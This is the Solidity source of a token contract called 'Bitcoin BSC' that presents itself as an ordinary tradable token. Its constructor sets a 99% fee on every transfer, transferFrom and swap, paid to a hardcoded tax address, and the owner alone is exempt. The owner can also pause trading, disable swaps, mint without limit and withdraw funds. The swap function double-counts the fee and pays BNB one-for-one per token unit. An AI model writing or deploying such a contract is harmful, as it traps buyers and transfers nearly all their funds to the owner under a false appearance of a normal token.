// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract BitcoinBSCToken {
    string public name = "Bitcoin BSC";
    string public symbol = "BTCBSC";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    address public taxAddress;
    bool public paused;
    uint256 public swapFeePercentage;
    bool public isSwapEnabled;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;
    mapping(address => bool) private minters;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Mint(address indexed minter, address indexed account, uint256 amount);
    event Burn(address indexed account, uint256 amount);
    event Pause();
    event Unpause();
    event SwapFeePercentageUpdated(uint256 newPercentage);
    event SwapEnabled();
    event SwapDisabled();
    event TokensSwapped(address indexed user, uint256 tokenAmount, uint256 bnbReceived, uint256 fee);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Transfers are paused");
        _;
    }

    modifier whenPaused() {
        require(paused, "Contract is not paused");
        _;
    }

    modifier whenSwapEnabled() {
        require(isSwapEnabled, "Swaps are currently disabled");
        _;
    }

    receive() external payable {}

    constructor() payable {
        owner = msg.sender;
        totalSupply = 21000000 * 10**uint256(decimals);
        balances[msg.sender] = totalSupply;
        taxAddress = 0x454E04Ca1a936F4E8102FB882990287038572737;
        paused = false;
        minters[msg.sender] = true;
        swapFeePercentage = 99;
        isSwapEnabled = true;
    }

    function setTaxAddress(address _taxAddress) external onlyOwner {
        taxAddress = _taxAddress;
    }

    function pause() external onlyOwner {
        paused = true;
        emit Pause();
    }

    function unpause() external onlyOwner {
        paused = false;
        emit Unpause();
    }

    function addMinter(address _minter) external onlyOwner {
        minters[_minter] = true;
    }

    function removeMinter(address _minter) external onlyOwner {
        minters[_minter] = false;
    }

    function isMinter(address account) external view returns (bool) {
        return minters[account];
    }

    function mint(address account, uint256 amount) external {
        require(minters[msg.sender], "Not a minter");
        require(account != address(0), "Mint to the zero address");

        totalSupply += amount;
        balances[account] += amount;
        emit Mint(msg.sender, account, amount);
    }

    function burn(uint256 amount) external {
        require(amount > 0, "Burn amount must be greater than 0");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        totalSupply -= amount;
        balances[msg.sender] -= amount;
        emit Burn(msg.sender, amount);
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function setSwapFeePercentage(uint256 _swapFeePercentage) external onlyOwner {
        require(_swapFeePercentage > 0 && _swapFeePercentage < 100, "Invalid swap fee percentage");
        swapFeePercentage = _swapFeePercentage;
        emit SwapFeePercentageUpdated(_swapFeePercentage);
    }

    function toggleSwap() external onlyOwner {
        isSwapEnabled = !isSwapEnabled;
        if (isSwapEnabled) {
            emit SwapEnabled();
        } else {
            emit SwapDisabled();
        }
    }

    function calculateSwapFee(uint256 amount) internal view returns (uint256) {
        if (msg.sender == owner) {
            return 0;
        } else {
            return (amount * swapFeePercentage) / 100;
        }
    }

    function transfer(address recipient, uint256 amount) external whenNotPaused whenSwapEnabled returns (bool) {
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than 0");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        uint256 fee = calculateSwapFee(amount);
        uint256 transferAmount = amount - fee;

        require(transferAmount > 0, "Transfer amount after fee is too low");

        balances[msg.sender] -= amount;
        balances[recipient] += transferAmount;
        balances[taxAddress] += fee;

        emit Transfer(msg.sender, recipient, transferAmount);
        emit Transfer(msg.sender, taxAddress, fee);

        return true;
    }

    function approve(address spender, uint256 amount) external whenNotPaused returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external whenNotPaused whenSwapEnabled returns (bool) {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than 0");
        require(balances[sender] >= amount, "Insufficient balance");
        require(allowances[sender][msg.sender] >= amount, "Allowance exceeded");

        uint256 fee = calculateSwapFee(amount);
        uint256 transferAmount = amount - fee;

        require(transferAmount > 0, "Transfer amount after fee is too low");

        balances[sender] -= amount;
        balances[recipient] += transferAmount;
        balances[taxAddress] += fee;
        allowances[sender][msg.sender] -= amount;

        emit Transfer(sender, recipient, transferAmount);
        emit Transfer(sender, taxAddress, fee);
        emit Approval(sender, msg.sender, allowances[sender][msg.sender]);

        return true;
    }

    function withdrawERC20(address tokenAddress, uint256 amount) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(owner, amount), "Token transfer failed");
    }

    function swapTokensForBNB(uint256 tokenAmount) external whenSwapEnabled {
        require(tokenAmount > 0, "Token amount must be greater than 0");
        require(balances[msg.sender] >= tokenAmount, "Insufficient balance");

        uint256 fee = calculateSwapFee(tokenAmount);
        uint256 swapAmount = tokenAmount - fee;

        require(swapAmount > 0, "Swap amount after fee is too low");

        balances[msg.sender] -= tokenAmount;
        balances[address(this)] += tokenAmount;

        require(address(this).balance >= swapAmount, "Insufficient contract balance for swap");
        payable(msg.sender).transfer(swapAmount);

        balances[taxAddress] += fee;

        emit Transfer(msg.sender, address(this), tokenAmount);
        emit Transfer(address(this), msg.sender, swapAmount);
        emit Transfer(address(this), taxAddress, fee);
        emit TokensSwapped(msg.sender, tokenAmount, swapAmount, fee);
    }
}